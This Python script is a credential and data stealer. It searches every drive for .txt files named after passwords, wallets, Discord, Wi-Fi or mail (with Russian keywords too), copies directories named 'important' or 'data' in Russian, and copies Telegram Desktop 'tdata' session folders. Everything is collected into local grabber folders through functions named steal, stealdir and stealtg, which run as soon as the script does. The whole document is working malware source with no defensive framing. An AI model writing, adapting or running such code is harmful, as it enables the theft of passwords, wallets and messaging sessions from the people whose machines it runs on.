import os
import shutil

os.makedirs('files grabber', exist_ok=True)
os.makedirs('tg grabber', exist_ok=True)
os.makedirs('dirs grabber', exist_ok=True)

tdisc = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'Z:\\', 'X:\\']

tfile = ['password', 'pass', 'login', 'discord', 'secret', 'wallet', 'wifi', 'parol', 'mail', 'email', 'пароль', 'пасс', 'данные', 'важное', 'пароли', 'секрет', 'роутер', 'почта',]

tdirs = ['важное', 'инфа', 'данные', 'реквизиты', 'информация',]

tg = ['tdata', 'telegram desktop']

ttxt = '.txt'

ch = 0

ch2 = 0

def steal():
    print('Start founding files.')
    try:
        for grab in tdisc:
            for text, direct, files in os.walk(grab):
                for name in files:
                    try:
                        namey = name.lower()
                        namesplit, txtsplit = os.path.splitext(namey)
                        if txtsplit == ttxt:
                            namey2 = namesplit.lower()
                            for word in tfile:
                                if word in namey2:
                                    grabdir = os.path.join(text, name)
                                    shutil.copy(grabdir, 'files grabber')
                                    break                   
                    except:
                        print('Error copypasta files')
        print('End copypasta files.')
    except:
        print('Error script data')
        
def stealdir():
    global ch
    print('Start founding dirs')
    try:
        for grabdir in tdisc:
            for text, direct, files in os.walk(grabdir):
                if 'pp4grab' in text.lower(): continue
                for name in direct:
                    try:
                        namey = name.lower()
                        for word in tdirs:
                            if word in namey:
                                ch = ch + 1
                                rgrabdir = os.path.join(text, name)
                                unicname = f'{ch}_{name}'
                                patchs = os.path.join('dirs grabber', unicname)
                                shutil.copytree(rgrabdir, patchs)
                                break
                    except:
                        print('Error copypasta dirs')
        print('End copypasta dirs')
    except:
        print('Error script data')
                       
def stealtg():
    global ch2
    print('Start founding tg info')
    try:
        for grabdir in tdisc:
            for text, direct, files in os.walk(grabdir):
                if 'pp4grab' in text.lower(): continue
                for name in direct:
                    try:
                        namey = name.lower()
                        for word in tg:
                            if word == namey:
                                ch2 = ch2 + 1
                                rgrabdir = os.path.join(text, name)
                                unicname = f'{ch2}_{name}'
                                patchs = os.path.join('tg grabber', unicname)
                                shutil.copytree(rgrabdir, patchs)
                                break
                    except:
                        print('Error copypasta tg info')
        print('End copypasta tg info')
    except:
        print('Error script data')

stealtg()              
stealdir()
steal()
